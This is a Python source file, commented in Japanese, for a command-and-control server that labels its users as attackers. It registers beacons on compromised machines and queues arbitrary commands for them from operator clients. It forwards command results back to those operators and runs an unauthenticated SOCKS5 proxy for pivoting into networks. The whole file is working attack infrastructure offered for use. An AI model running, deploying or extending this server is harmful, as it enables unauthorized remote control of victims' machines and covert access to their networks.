# -*- coding: utf-8 -*-
"""
C2サーバ - 攻撃者クライアント + Beacon対応版
SOCKSプロキシ機能付き
"""

import socket
import threading
import struct
import sys
import time
import random
import json
import base64
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', c2_port=4444, socks_port=1080):
        self.host = host
        self.c2_port = c2_port
        self.socks_port = socks_port
        self.beacons = {}  # beacon_id: {socket, last_seen, info}
        self.operators = {}  # operator_id: {socket, info}
        self.pending_tasks = {}  # beacon_id: [task_queue]
        self.command_results = {}  # 一時的な結果保存
        self.running = False
        
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")
        
    def start(self):
        """C2サーバとSOCKSプロキシを開始"""
        self.running = True
        
        # C2サーバスレッド
        c2_thread = threading.Thread(target=self.start_c2_server)
        c2_thread.daemon = True
        c2_thread.start()
        
        # SOCKSプロキシスレッド
        socks_thread = threading.Thread(target=self.start_socks_proxy)
        socks_thread.daemon = True
        socks_thread.start()
        
        # Beacon管理スレッド
        beacon_mgmt_thread = threading.Thread(target=self.beacon_manager)
        beacon_mgmt_thread.daemon = True
        beacon_mgmt_thread.start()
        
        self.log(f"C2サーバ開始: {self.host}:{self.c2_port}")
        self.log(f"SOCKSプロキシ開始: {self.host}:{self.socks_port}")
        self.log("攻撃者クライアントとBeaconの接続を待機中...")
        
        try:
            # サーバモードではコマンドインターフェースは提供しない
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.log("サーバ停止中...")
            self.running = False
            
    def start_c2_server(self):
        """C2コマンド&コントロールサーバ"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.c2_port))
        server_socket.listen(10)
        
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                self.log(f"新規接続: {addr}")
                
                # クライアント識別スレッド
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.log(f"C2サーバエラー: {e}")
                    
    def handle_client(self, client_socket, addr):
        """クライアント種別判定と処理振り分け"""
        try:
            client_socket.settimeout(30)  # 初期認証タイムアウト
            
            # 最初のメッセージで種別判定
            initial_data = client_socket.recv(4096)
            if not initial_data:
                client_socket.close()
                return
                
            try:
                client_info = json.loads(initial_data.decode('utf-8'))
                client_type = client_info.get('type')
                
                if client_type == 'register':
                    # Beacon接続
                    self.handle_beacon(client_socket, addr, client_info)
                elif client_type == 'operator_auth':
                    # 攻撃者クライアント接続
                    self.handle_operator(client_socket, addr, client_info)
                else:
                    self.log(f"不明なクライアントタイプ: {client_type}")
                    client_socket.close()
                    
            except json.JSONDecodeError:
                self.log(f"不正な初期データ: {initial_data}")
                client_socket.close()
                
        except Exception as e:
            self.log(f"クライアント処理エラー: {e}")
            client_socket.close()
            
    def handle_beacon(self, client_socket, addr, initial_data):
        """Beaconセッション処理"""
        beacon_id = initial_data.get('beacon_id')
        if not beacon_id:
            client_socket.close()
            return
            
        try:
            # Beacon登録
            self.beacons[beacon_id] = {
                'socket': client_socket,
                'last_seen': time.time(),
                'info': initial_data.get('info', {}),
                'addr': addr
            }
            self.pending_tasks[beacon_id] = []
            self.log(f"新Beacon登録: {beacon_id} from {addr}")
            
            # 登録確認応答
            response = {'type': 'ack', 'message': 'registered'}
            client_socket.send(json.dumps(response).encode('utf-8'))
            
            # 攻撃者クライアントに新Beacon通知
            self.notify_operators_beacon_update()
            
            client_socket.settimeout(120)  # チェックインタイムアウト
            
            # Beaconループ処理
            while self.running:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                        
                    try:
                        beacon_data = json.loads(data.decode('utf-8'))
                        
                        if beacon_data.get('type') == 'checkin':
                            # チェックイン処理
                            self.beacons[beacon_id]['last_seen'] = time.time()
                            
                            # 待機中のタスクがあるかチェック
                            if beacon_id in self.pending_tasks and self.pending_tasks[beacon_id]:
                                task = self.pending_tasks[beacon_id].pop(0)
                                response = {'type': 'task', 'command': task['command']}
                                client_socket.send(json.dumps(response).encode('utf-8'))
                                self.log(f"[{beacon_id}] タスク送信: {task['command']}")
                            else:
                                # タスクなし
                                response = {'type': 'sleep', 'interval': 30}
                                client_socket.send(json.dumps(response).encode('utf-8'))
                                
                        elif beacon_data.get('type') == 'result':
                            # コマンド実行結果
                            result = beacon_data.get('result', '')
                            command = beacon_data.get('command', '')
                            self.log(f"[{beacon_id}] 実行結果受信")
                            
                            # 攻撃者クライアントに結果転送
                            self.forward_result_to_operators(beacon_id, command, result)
                            
                            # 結果受信確認
                            response = {'type': 'ack'}
                            client_socket.send(json.dumps(response).encode('utf-8'))
                            
                    except json.JSONDecodeError:
                        self.log(f"不正なJSON from {beacon_id}: {data}")
                        
                except socket.timeout:
                    continue
                except:
                    break
                    
        except Exception as e:
            self.log(f"Beaconハンドラエラー [{beacon_id}]: {e}")
        finally:
            if beacon_id and beacon_id in self.beacons:
                del self.beacons[beacon_id]
                if beacon_id in self.pending_tasks:
                    del self.pending_tasks[beacon_id]
                self.log(f"Beacon切断: {beacon_id}")
                self.notify_operators_beacon_update()
            client_socket.close()
            
    def handle_operator(self, client_socket, addr, initial_data):
        """攻撃者クライアントセッション処理"""
        operator_id = initial_data.get('operator_id')
        if not operator_id:
            client_socket.close()
            return
            
        try:
            # オペレーター登録
            self.operators[operator_id] = {
                'socket': client_socket,
                'info': initial_data,
                'addr': addr,
                'connected_time': time.time()
            }
            self.log(f"攻撃者クライアント接続: {operator_id} from {addr}")
            
            # 認証確認応答
            response = {'type': 'auth_success', 'operator_id': operator_id}
            client_socket.send(json.dumps(response).encode('utf-8'))
            
            client_socket.settimeout(None)  # 攻撃者クライアントはタイムアウトなし
            
            # オペレーターコマンド処理ループ
            while self.running:
                try:
                    data = client_socket.recv(8192)
                    if not data:
                        break
                        
                    try:
                        operator_command = json.loads(data.decode('utf-8'))
                        self.process_operator_command(operator_id, operator_command)
                        
                    except json.JSONDecodeError:
                        self.log(f"不正なJSON from operator {operator_id}: {data}")
                        
                except:
                    break
                    
        except Exception as e:
            self.log(f"オペレーターハンドラエラー [{operator_id}]: {e}")
        finally:
            if operator_id and operator_id in self.operators:
                del self.operators[operator_id]
                self.log(f"攻撃者クライアント切断: {operator_id}")
            client_socket.close()
            
    def process_operator_command(self, operator_id, command):
        """攻撃者クライアントからのコマンド処理"""
        cmd_type = command.get('type')
        operator_socket = self.operators[operator_id]['socket']
        
        try:
            if cmd_type == 'get_beacons':
                # Beacon一覧要求
                beacon_list = {}
                for beacon_id, beacon_info in self.beacons.items():
                    beacon_list[beacon_id] = {
                        'info': beacon_info['info'],
                        'addr': beacon_info['addr'],
                        'last_seen': beacon_info['last_seen']
                    }
                
                response = {
                    'type': 'beacon_list',
                    'beacons': beacon_list
                }
                operator_socket.send(json.dumps(response).encode('utf-8'))
                
            elif cmd_type == 'send_command':
                # Beaconにコマンド送信
                beacon_id = command.get('beacon_id')
                cmd_to_send = command.get('command')
                
                if beacon_id in self.beacons:
                    if beacon_id not in self.pending_tasks:
                        self.pending_tasks[beacon_id] = []
                    
                    task = {
                        'command': cmd_to_send,
                        'operator_id': operator_id,
                        'timestamp': time.time()
                    }
                    self.pending_tasks[beacon_id].append(task)
                    
                    self.log(f"[{beacon_id}] タスクキューイング: {cmd_to_send} (from {operator_id})")
                    
                    response = {
                        'type': 'command_queued',
                        'beacon_id': beacon_id,
                        'command': cmd_to_send
                    }
                    operator_socket.send(json.dumps(response).encode('utf-8'))
                else:
                    response = {
                        'type': 'error',
                        'message': f'Beacon {beacon_id} not found'
                    }
                    operator_socket.send(json.dumps(response).encode('utf-8'))
                    
            elif cmd_type == 'get_beacon_info':
                # 特定Beacon詳細情報
                beacon_id = command.get('beacon_id')
                if beacon_id in self.beacons:
                    beacon_info = self.beacons[beacon_id]
                    response = {
                        'type': 'beacon_info',
                        'beacon_id': beacon_id,
                        'info': beacon_info['info'],
                        'addr': beacon_info['addr'],
                        'last_seen': beacon_info['last_seen'],
                        'pending_tasks': len(self.pending_tasks.get(beacon_id, []))
                    }
                    operator_socket.send(json.dumps(response).encode('utf-8'))
                else:
                    response = {
                        'type': 'error',
                        'message': f'Beacon {beacon_id} not found'
                    }
                    operator_socket.send(json.dumps(response).encode('utf-8'))
                    
        except Exception as e:
            self.log(f"オペレーターコマンド処理エラー: {e}")
            
    def forward_result_to_operators(self, beacon_id, command, result):
        """コマンド実行結果を全攻撃者クライアントに転送"""
        result_data = {
            'type': 'command_result',
            'beacon_id': beacon_id,
            'command': command,
            'result': result,
            'timestamp': time.time()
        }
        
        # 全攻撃者クライアントに送信
        for operator_id, operator_info in list(self.operators.items()):
            try:
                operator_info['socket'].send(json.dumps(result_data).encode('utf-8'))
            except Exception as e:
                self.log(f"結果転送エラー to {operator_id}: {e}")
                
    def notify_operators_beacon_update(self):
        """Beacon状態変更を攻撃者クライアントに通知"""
        beacon_list = {}
        for beacon_id, beacon_info in self.beacons.items():
            beacon_list[beacon_id] = {
                'info': beacon_info['info'],
                'addr': beacon_info['addr'],
                'last_seen': beacon_info['last_seen']
            }
        
        update_data = {
            'type': 'beacon_list',
            'beacons': beacon_list
        }
        
        # 全攻撃者クライアントに送信
        for operator_id, operator_info in list(self.operators.items()):
            try:
                operator_info['socket'].send(json.dumps(update_data).encode('utf-8'))
            except Exception as e:
                self.log(f"Beacon更新通知エラー to {operator_id}: {e}")
                
    def beacon_manager(self):
        """Beacon状態管理"""
        while self.running:
            try:
                current_time = time.time()
                dead_beacons = []
                
                # 死活監視（5分間応答なしで削除）
                for beacon_id, beacon_info in self.beacons.items():
                    if current_time - beacon_info['last_seen'] > 300:
                        dead_beacons.append(beacon_id)
                        
                for beacon_id in dead_beacons:
                    self.log(f"Beaconタイムアウト: {beacon_id}")
                    if beacon_id in self.beacons:
                        try:
                            self.beacons[beacon_id]['socket'].close()
                        except:
                            pass
                        del self.beacons[beacon_id]
                    if beacon_id in self.pending_tasks:
                        del self.pending_tasks[beacon_id]
                    
                    # タイムアウトを攻撃者クライアントに通知
                    self.notify_operators_beacon_update()
                        
                time.sleep(30)
                
            except Exception as e:
                self.log(f"Beacon管理エラー: {e}")
                
    def start_socks_proxy(self):
        """SOCKS5プロキシサーバ"""
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_socket.bind((self.host, self.socks_port))
        proxy_socket.listen(10)
        
        while self.running:
            try:
                client_socket, addr = proxy_socket.accept()
                self.log(f"SOCKSクライアント接続: {addr}")
                
                proxy_thread = threading.Thread(
                    target=self.handle_socks_client,
                    args=(client_socket,)
                )
                proxy_thread.daemon = True
                proxy_thread.start()
                
            except Exception as e:
                if self.running:
                    self.log(f"SOCKSプロキシエラー: {e}")
                    
    def handle_socks_client(self, client_socket):
        """SOCKS5クライアント処理"""
        try:
            # SOCKS5認証ネゴシエーション
            auth_data = client_socket.recv(256)
            if len(auth_data) < 2 or auth_data[0] != 5:
                client_socket.close()
                return
                
            # 認証不要で応答
            client_socket.send(b'\x05\x00')
            
            # 接続リクエスト受信
            request = client_socket.recv(256)
            if len(request) < 4 or request[0] != 5 or request[1] != 1:
                client_socket.close()
                return
                
            # ターゲットアドレス解析
            addr_type = request[3]
            if addr_type == 1:  # IPv4
                target_addr = socket.inet_ntoa(request[4:8])
                target_port = struct.unpack('>H', request[8:10])[0]
            elif addr_type == 3:  # ドメイン名
                domain_len = request[4]
                target_addr = request[5:5+domain_len].decode('utf-8')
                target_port = struct.unpack('>H', request[5+domain_len:7+domain_len])[0]
            else:
                # 未対応のアドレスタイプ
                client_socket.send(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
                
            self.log(f"SOCKS接続要求: {target_addr}:{target_port}")
            
            # ターゲットサーバに接続
            try:
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_socket.connect((target_addr, target_port))
                
                # 成功応答
                client_socket.send(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
                
                # データリレー開始
                self.relay_data(client_socket, target_socket)
                
            except Exception as e:
                self.log(f"ターゲット接続失敗 {target_addr}:{target_port} - {e}")
                # 接続失敗応答
                client_socket.send(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                
        except Exception as e:
            self.log(f"SOCKSハンドラエラー: {e}")
            client_socket.close()
            
    def relay_data(self, client_socket, target_socket):
        """クライアントとターゲット間でデータをリレー"""
        def forward(source, destination, direction):
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    destination.send(data)
            except:
                pass
            finally:
                try:
                    source.close()
                    destination.close()
                except:
                    pass
                
        # 双方向データリレー
        client_to_target = threading.Thread(
            target=forward, 
            args=(client_socket, target_socket, "C->T")
        )
        target_to_client = threading.Thread(
            target=forward, 
            args=(target_socket, client_socket, "T->C")
        )
        
        client_to_target.daemon = True
        target_to_client.daemon = True
        
        client_to_target.start()
        target_to_client.start()

def main():
    """メイン関数"""
    import argparse
    
    parser = argparse.ArgumentParser(description="C2サーバ - 攻撃者クライアント対応版")
    parser.add_argument('--host', default='0.0.0.0',
                       help='バインドアドレス (デフォルト: 0.0.0.0)')
    parser.add_argument('--c2-port', type=int, default=4444,
                       help='C2ポート (デフォルト: 4444)')
    parser.add_argument('--socks-port', type=int, default=1080,
                       help='SOCKSプロキシポート (デフォルト: 1080)')
    
    args = parser.parse_args()
    
    server = C2Server(args.host, args.c2_port, args.socks_port)
    server.start()

if __name__ == "__main__":
    main()
